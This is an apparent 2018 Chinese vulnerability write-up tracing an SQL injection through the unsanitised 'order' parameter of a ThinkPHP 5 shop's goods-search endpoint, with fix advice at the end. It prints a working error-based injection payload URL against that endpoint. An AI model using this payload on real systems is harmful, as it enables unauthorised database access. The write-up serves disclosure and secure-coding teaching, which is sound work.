## 说明
- 作者 | Author：0x584A
- 时间 | Date：2018/09/11
- 来源 | Source：<https://www.jgeek.cn/archive/id/7.html>

## 代码
- 分类 | Category：SQL inject
- 语言 | Language：PHP

首先我们找到入口方法 `getGoodsListByKeyWord()`，发现很多变量可控，但用的是TP5框架，将查询参数进行了预处理。

但经过测试后发现 `$order` 变量存在问题。

```php
public function getGoodsListByKeyWord()
{
    $page_index = 1;
    $page_size = 0;
    $keyword = request()->get('keyword');
    $order = "";
    $list = null;
    $this->goods = new GoodsService();
    if ($keyword) {
        $page_index = request()->get('page_index', 1);
        $page_size = request()->get('page_size', 0);

        $order = request()->get('order', '');
        $list = $this->goods->getGoodsViewList($page_index, $page_size, array(
            "ng.goods_name" => array(
                "like",
                "%" . $keyword . "%"
            )
        ), $order); // <----- 可控变量 $order
    } else {
        $list = $this->goods->getGoodsViewList($page_index, $page_size, "", $order);
    }
    return $list;
}
```

我们跟随调用方法，进一步查看参数的完整传递链

`data/service/Goods.php`

```php
public function getGoodsViewList($page_index = 1, $page_size = 0, $condition = '', $order = 'ng.sort asc')
{
    $goods_view = new NsGoodsViewModel();
    $list = $goods_view->getGoodsViewList($page_index, $page_size, $condition, $order); // <----- 可控变量 $order
    return $list;
}
```

`data/model/NsGoodsDeletedViewModel.php`

```php
// NsGoodsViewModel 类 中的 getGoodsViewList()

public function getGoodsViewList($page_index, $page_size, $condition, $order)
{
    $queryList = $this->getGoodsViewQuery($page_index, $page_size, $condition, $order);
    $queryCount = $this->getGoodsrViewCount($condition);
    $list = $this->setReturnList($queryList, $queryCount, $page_size);
    return $list;
}

// ...省略多个方法...

public function getGoodsViewQuery($page_index, $page_size, $condition, $order)
{
    $viewObj = $this->alias('ng')
        ->join('ns_goods_category ngc', 'ng.category_id = ngc.category_id', 'left')
        ->join('ns_goods_brand ngb', 'ng.brand_id = ngb.brand_id', 'left')
        ->join('sys_album_picture sap', 'ng.picture = sap.pic_id', 'left')
        ->join('ns_shop nss', 'ng.shop_id = nss.shop_id', 'left')
        ->field('ng.goods_id, ng.goods_name, ng.shop_id, ng.category_id, ng.brand_id, ng.group_id_array,
         ng.promotion_type, ng.goods_type, ng.market_price, ng.price, ng.promotion_price,
        ng.cost_price, ng.point_exchange_type, ng.point_exchange, ng.give_point,
        ng.is_member_discount, ng.shipping_fee, ng.shipping_fee_id, ng.stock, ng.max_buy,
        ng.min_stock_alarm, ng.clicks, ng.sales, ng.collects, ng.star, ng.evaluates,
        ng.shares, ng.province_id, ng.city_id, ng.picture, ng.keywords, ng.introduction,
        ng.description, ng.QRcode, ng.code, ng.is_stock_visible, ng.is_hot, ng.is_recommend,
        ng.is_new, ng.is_pre_sale, ng.is_bill, ng.state, ng.sale_date, ng.create_time,
        ng.update_time, ng.sort, ng.real_sales, ngb.brand_name, ngb.brand_pic, ngc.category_id, ngc.category_name, sap.pic_cover_micro,sap.pic_cover_mid,sap.pic_cover_small,nss.shop_name,nss.shop_type,sap.pic_id,sap.upload_type, sap.domain, sap.bucket, ng.is_open_presell ');
    $list = $this->viewPageQuery($viewObj, $page_index, $page_size, $condition, $order); // <----- 可控变量 $order
    if (! empty($list)) {
        $goods_group_model = new NsGoodsGroupModel();
        $goods_sku = new NsGoodsSkuModel();
        foreach ($list as $k => $v) {
            // 获取group列表
            $group_name_query = $goods_group_model->all($v['group_id_array']);
            $list[$k]['group_query'] = $group_name_query;
            // 获取sku列表
            $sku_list = $goods_sku->where([
                'goods_id' => $v['goods_id']
            ])->select();
            $list[$k]['sku_list'] = $sku_list;
        }
    }
    return $list;
}

```

`data/model/BaseModel.php`

```php
public function viewPageQuery($viewObj, $page_index, $page_size, $condition, $order)
{
    if ($page_size == 0) {
        $list = $viewObj->where($condition)
            ->order($order) // <----- 可控变量 $order
            ->limit(0, 1000000)
            ->select();
    } else {
        $start_row = $page_size * ($page_index - 1);

        $list = $viewObj->where($condition)
            ->order($order)
            ->limit($start_row . "," . $page_size)
            ->select();
    }
    return $list;
}
```

进入TP框架代码内 `thinkphp/library/think/db/Query.php`

```php
public function select($data = null)
{
    if ($data instanceof Query) {
        return $data->select();
    } elseif ($data instanceof \Closure) {
        call_user_func_array($data, [ & $this]);
        $data = null;
    }
    // 分析查询表达式
    $options = $this->parseExpress();

    if (false === $data) {
        // 用于子查询 不查询只返回SQL
        $options['fetch_sql'] = true;
    } elseif (!is_null($data)) {
        // 主键条件分析
        $this->parsePkWhere($data, $options);
    }

    $resultSet = false;
    if (empty($options['fetch_sql']) && !empty($options['cache'])) {
        // 判断查询缓存
        $cache = $options['cache'];
        unset($options['cache']);
        $key       = is_string($cache['key']) ? $cache['key'] : md5(serialize($options));
        $resultSet = Cache::get($key);
    }
    if (!$resultSet) {
        // 生成查询SQL
        // $options中含有恶意语句，在 select() 中调用 $this->parseOrder($options['order'], $options)，最终拼接成恶意查询语句
        // 绕过了下面预处理，导致报错注入、延时盲注
        $sql = $this->builder()->select($options);
        // 获取参数绑定
        $bind = $this->getBind();
        if ($options['fetch_sql']) {
            // 获取实际执行的SQL语句
            return $this->connection->getRealSql($sql, $bind);
        }
        // 执行查询操作
        $resultSet = $this->query($sql, $bind, $options['master'], $options['fetch_class']);

        if ($resultSet instanceof \PDOStatement) {
            // 返回PDOStatement对象
            return $resultSet;
        }

        if (isset($cache)) {
            // 缓存数据集
            if (isset($cache['tag'])) {
                Cache::tag($cache['tag'])->set($key, $resultSet, $cache['expire']);
            } else {
                Cache::set($key, $resultSet, $cache['expire']);
            }
        }
    }

    // 返回结果处理
    if (count($resultSet) > 0) {
        // 数据列表读取后的处理
        if (!empty($this->model)) {
            // 生成模型对象
            $model = $this->model;
            foreach ($resultSet as $key => $result) {
                /** @var Model $result */
                $result = new $model($result);
                $result->isUpdate(true);
                // 关联查询
                if (!empty($options['relation'])) {
                    $result->relationQuery($options['relation']);
                }
                $resultSet[$key] = $result;
            }
            if (!empty($options['with']) && $result instanceof Model) {
                // 预载入
                $resultSet = $result->eagerlyResultSet($resultSet, $options['with'], is_object($resultSet) ? get_class($resultSet) : '');
            }
        }
    } elseif (!empty($options['fail'])) {
        $this->throwNotFound($options);
    }
    return $resultSet;
}
```


```
payload：index.php?s=/shop/Goods/getGoodsListByKeyWord&keyword=1&order=1 AND (SELECT 9110 FROM(SELECT COUNT(*),CONCAT(0x716b786271,(SELECT (ELT(9110=9110,1))),0x717a786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```


## 修复
* 过滤外部接收的恶意参数

* 不要在预处理参数绑定前拼接SQL查询，除非你知道你正在做的是什么

* 升级TP框架至最新